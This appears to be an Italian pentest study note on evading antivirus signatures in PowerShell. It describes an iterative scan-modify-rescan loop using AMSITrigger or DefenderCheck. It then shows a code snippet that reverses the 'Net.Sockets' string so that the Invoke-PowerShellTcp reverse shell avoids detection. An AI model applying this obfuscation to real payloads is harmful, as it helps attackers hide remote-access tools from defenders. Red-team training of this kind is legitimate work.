# 11-Powershell - Bypassing AV Signatures2

* Step per evitare detection signature based:

1. Scan sullo script con AMSITrigger o DefenderCheck
2. Modifica allo snippet/stringa rilevato dai tool al punto1
3. Rescan con AMSITrigger o DefenderCheck
4. Ripetere step 2 e 3 finche' non avremo in output dagli script di scan "AMSI\_RESULT\_NOT\_DETECTED" oppure"Blank"&#x20;

#### Esempio: Bypass AV signature per Invoke-PowerShellTcp

* Scan utilizzando AMSITrigger&#x20;

<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Reverse the "Net.Sockets" string on line number 32

```powershell
$String = "stekcoS.teN"
$class = ([regex]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) -join ''
if ($Reverse)
{
    $client = New-Object System.$class.TCPClient($IPAddress,$Port)
}
```

* Rescan con AMSITrigger

